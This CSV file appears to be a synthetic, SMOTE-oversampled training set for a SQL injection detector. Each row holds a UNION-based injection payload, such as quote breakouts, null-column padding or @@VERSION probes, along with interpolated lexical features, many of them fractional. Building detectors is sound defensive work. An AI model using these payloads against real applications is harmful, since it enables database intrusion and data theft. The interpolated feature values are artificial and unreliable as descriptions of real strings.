id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000034,attack,union,"-2959"" union all select 3414,3414,3414,3414,3414,3414,3414,3414#",nearest_attack_euclidean,R001558,0.32660176690201287,66.07726960280158,21.415453920560317,3.710610381166103,14.0,37.66181568224126,4.0,10.415453920560315,0.21216445325198774,0.5696500221835561,0.060618415214853644,0.15756710934960244,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.415453920560315,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000035,attack,union,"1""   )    )    as eglv where 7412  =  7412 union all select null#",nearest_attack_euclidean,R000291,0.2735473843062943,63.9334061998434,23.847629457120487,3.7615782526851786,29.0,9.0,21.085776742722913,4.847629457120485,0.45435841384735853,0.14100778360780092,0.3289232233104601,0.07571057923438053,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.8476294571204854,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000036,attack,union,"-7235""  )   union all select 4624,4624,4624,4624,4624,4624,4624,4624,4624,4624#",nearest_attack_euclidean,R000418,0.05952757073974867,78.54357351064091,21.908714702128183,3.5303755662912937,14.0,43.63485880851273,8.0,12.908714702128181,0.1783082399676749,0.5554629851871887,0.10189042283867136,0.16433835200646502,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.908714702128181,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000037,attack,union,"-8869"" where 3019  =  3019 union all select 3019,3019,3019#",nearest_attack_euclidean,R001343,0.6581672388424453,63.16338063567439,25.0,4.041794653958309,19.0,27.33070450853951,10.0,6.832676127134878,0.3026027432871988,0.4305061239861572,0.15926460173010465,0.1076265309965393,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.832676127134878,2.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000038,attack,union,"1'+  (  select 'sacd' where 5984  =  5984 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001564,0.31301633487157016,91.50591037908762,26.0,3.9760784938534024,55.0047283032701,9.0,15.0,12.501182075817525,0.6002703432398862,0.09876741268357278,0.1646123544726213,0.13634988960391978,3.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.501182075817524,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000039,attack,union,"-1438 where 6759  =  6759 union all select 6759,6759#",nearest_attack_euclidean,R000287,0.5452313304598543,56.58946879264262,25.760702080490493,4.177197486940753,19.0,22.871575034114095,10.0,4.7178937585285246,0.3395671734017176,0.39966817451586983,0.17871956494827243,0.0820450871341402,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.717893758528524,2.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000040,attack,union,"-2263'  )   where 7931  =  7931 union all select 7931,7931,7931--",nearest_attack_euclidean,R001470,0.23925518469475174,63.493445550296,24.6986891100592,4.0386206956721145,19.0,22.7947564402368,14.0,7.6986891100592,0.29964731654984,0.35841448087392,0.22079275956304,0.1211454430132,1.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.6986891100591999,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000041,attack,union,"-2001'+  (  select 'nput' where 8368  =  8368 union all select 8368,8368,8368,8368,8368,8368,8368,8368,8368#",nearest_attack_euclidean,R001146,0.9334823457723365,109.17196698159546,28.0,3.9803353968311863,29.0,49.562622642127266,15.0,15.609344339468182,0.2656834298910353,0.45382956541818187,0.13742246373674244,0.1430645409540404,2.218688678936363,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,8.390655660531818,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000042,attack,union,"1' union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000834,0.35782754468941874,49.85309643452426,14.853096434524257,3.154857816819322,38.0,1.0,4.0,6.853096434524258,0.7622785042808482,0.02005996063896967,0.08023984255587877,0.1374216925243033,0.853096434524258,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.853096434524258,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000043,attack,union,"1  )   where 7425  =  7425 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000468,0.276957269029391,97.25910743106162,23.564776857765406,3.6094127862391585,60.69433057329621,9.0,14.564776857765406,13.0,0.623880844765509,0.09265897119268732,0.14961944787458872,0.133840736167215,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,9.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000044,attack,union,"-5058%' union all select 6789,6789,6789,6789,6789#",nearest_attack_euclidean,R000606,0.20116441479910918,51.12594978049009,21.774810043901983,4.05829796140671,14.0,24.900759824392072,4.0,8.225189956098017,0.27426789202659596,0.48655098054103324,0.07836225486474169,0.16081887256762917,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.225189956098018,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000045,attack,union,"1'||  (  select 'neqi' where 6873  =  6873 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001309,1.1521218731524825,99.98775167824405,26.797550335648808,4.026249535854982,60.190201342595245,9.0,15.79755033564881,15.0,0.6015091866380928,0.0902230969826851,0.15789588807474694,0.15037182830447515,3.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.39877516782440464,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.398775167824405
SMOTE_000046,attack,union,"-4127%' union all select 9558,9558,9558#",nearest_attack_euclidean,R001548,0.38807858575141035,37.774112503703776,22.554822500740755,4.224783429957866,14.0,14.219290002963024,4.0,5.554822500740756,0.37596868745678924,0.37032150004938374,0.10741962498765407,0.14629018750617295,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.5548225007407561,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000047,attack,union,"-8773%'   )    )     )   union all select 8941,8941,8941,8941,8941,8941#",nearest_attack_euclidean,R001145,0.42862325359233067,72.51394776361393,22.44860522363861,3.6949841535150902,14.0,28.411158210891138,18.0,12.102789552722784,0.19399200064148192,0.3898454843580097,0.24941828653904816,0.16674422846146025,1.0,0.0,1.0,0.0,0.0,0.0,0.0,3.0,1.0,0.0,5.1027895527227844,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000048,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000293,0.25385905994539143,72.41037197315913,22.0,3.754494794276648,40.80777897986935,9.0,14.602592993289782,8.0,0.5631025680655033,0.12459828795633109,0.20154511023920457,0.11075403373896098,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000049,attack,union,"-1270'||  (  select 'mgdi' where 6785  =  6785 union all select 6785,6785#",nearest_attack_euclidean,R000663,0.3547399876954259,72.36911517204436,30.02146910322662,4.336289154056483,29.0,18.695292137635494,15.0,9.673823034408873,0.40115465335109934,0.25774957202196225,0.20749378621608588,0.13360198841085252,3.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.6738230344088736,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000050,attack,union," select * from users where id  =  '1' or $<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000159,0.14210216393589972,75.27362502525153,33.0,4.42797308647487,42.0,3.0,17.0,13.273625025251539,0.5579838156034098,0.03985598682881497,0.22585059202995156,0.17630960553782377,3.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000051,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000046,0.026443456390546884,72.89228580831548,32.0,4.36571714717917,44.0,2.0,16.89228580831547,10.0,0.6036414430049695,0.0274382474093168,0.23172907253912983,0.13719123704658395,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000052,attack,union," select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",nearest_attack_euclidean,R000057,0.377120848052879,71.29950215645403,32.459900431290805,4.40993977414206,40.0,2.459900431290807,16.379701293872415,12.459900431290805,0.5616960269764667,0.03429967204194234,0.22928062219553197,0.174723678786059,3.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,4.459900431290805,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000053,attack,union,"-8021""  )   union all select 1166,1166,1166,1166--",nearest_attack_euclidean,R001647,0.004228326708018708,49.975164780894815,20.0,3.748759065748225,14.0,19.98013182471585,8.0,7.995032956178962,0.2801545302522101,0.3997792424968428,0.1600883030012629,0.15997792424968427,0.0,1.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.995032956178963,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000054,attack,union,"-4371'   )    )     )   union all select 7465,7465,7465,7465,7465,7465,7465#",nearest_attack_euclidean,R001122,0.012444256903002866,76.097364521633,22.0,3.7299149548360213,14.0,32.07789161730639,18.0,12.019472904326598,0.18398909952844997,0.4215081381129029,0.23655741367943567,0.15794534867921142,1.0,0.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,6.019472904326599,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000055,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001418,0.038047707708828746,77.69649984044658,17.0,3.14902317066154,49.75719987235726,1.0,14.0,12.939299968089315,0.6403646993364134,0.012873814569644065,0.1802334039750172,0.16652808211892536,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,7.9392999680893155,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000056,attack,union,"-1438 where 6759  =  6759 union all select 6759,6759#",nearest_attack_euclidean,R000287,0.542833524929521,56.57368311115088,25.761754459256608,4.177381210180331,19.0,22.8589464889207,10.0,4.714736622230175,0.3396503942530891,0.3995700615121476,0.17876336539636273,0.0820161788384006,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.7147366222301752,2.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000057,attack,union,"1' in boolean mode  )   union all select null,null#",nearest_attack_euclidean,R000881,0.0568993853463948,50.67017569930559,18.93403513986112,3.6636958652181955,34.73614055944447,1.0,11.0,3.934035139861119,0.6854590874066379,0.019748433205752064,0.217232765263273,0.07755971412433704,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.9340351398611193,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000058,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000053,0.25082080415398106,97.0,26.550611313918864,3.756235256840198,49.0,3.449388686081136,33.0,11.550611313918864,0.5051546391752577,0.03556070810392922,0.3402061855670103,0.11907846715380273,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000059,attack,union,"1' union all select null,null#",nearest_attack_euclidean,R000381,1.0212224198145508,33.432644509186076,14.61859505453488,3.3951789181675665,25.051239563720955,1.0,4.0,3.3814049454651203,0.7470247929141325,0.030399449137447798,0.12159779654979119,0.10097796139862852,0.6185950545348804,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.7628098909302392,0.0,0.6185950545348803,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000060,attack,union,"-1337""  )   union all select 7508--",nearest_attack_euclidean,R000732,0.0,35.0,20.0,3.943289445392768,14.0,8.0,8.0,5.0,0.4,0.22857142857142856,0.22857142857142856,0.14285714285714285,0.0,1.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000061,attack,union,"-5386'  )   union all select 8026,8026,8026,8026,8026,8026#",nearest_attack_euclidean,R000577,0.06899972500624679,58.50680320916252,22.098639358167496,3.940394136721488,14.0,27.605442567330016,8.0,8.901360641832504,0.23945535312985708,0.471604087136196,0.13683163035991835,0.1521089293740286,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,4.901360641832504,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000062,attack,union,"-3391' union all select 2024,2024--",nearest_attack_euclidean,R000228,0.007024238553899065,35.0,20.01980932403537,4.116554687821365,14.0,12.0,4.0,5.0,0.4,0.34285714285714286,0.1142857142857143,0.14285714285714285,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000063,attack,union,"-1949""   )    )    as urke where 8761  =  8761 union all select 8761,8761,8761,8761,8761,8761,8761#",nearest_attack_euclidean,R000414,0.007034082793345949,99.0549718776846,27.0,3.9745405108259475,25.0,40.04397750214767,22.0,12.010994375536917,0.2523917738012709,0.4042496986796072,0.22210476094511838,0.12125376657400348,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,6.010994375536917,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000064,attack,union," select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",nearest_attack_euclidean,R000040,0.002269480224265036,76.0098977471993,27.0,3.9230221566957875,40.0,3.0,23.00989774719931,10.0,0.5262481356992528,0.03946861017744402,0.30272122019848996,0.1315620339248132,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000065,attack,union,"-2046'  )   union all select 6668,6668--",nearest_attack_euclidean,R001052,0.14716935139761173,40.0,20.0,3.892424162999595,14.0,12.0,8.0,6.0,0.35,0.3,0.2,0.15,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000066,attack,union,"1%' union all select null,null--",nearest_attack_euclidean,R000927,0.13310333298293003,32.951934365972676,16.0,3.596055989848558,22.761547492778142,1.0,4.0,5.1903868731945355,0.6900498241945696,0.030541715501508443,0.1221668620060337,0.1572415982978882,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.1903868731945355,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000067,attack,union,"-2667  )   union all select 5848,5848,5848,5848--",nearest_attack_euclidean,R000859,0.24055603144998813,47.374079047338114,20.0,3.9010460624330987,14.0,18.699263237870493,8.0,6.674815809467623,0.29627221397832393,0.3936838208297272,0.16929840798761367,0.1407455572043352,0.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.6748158094676233,3.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
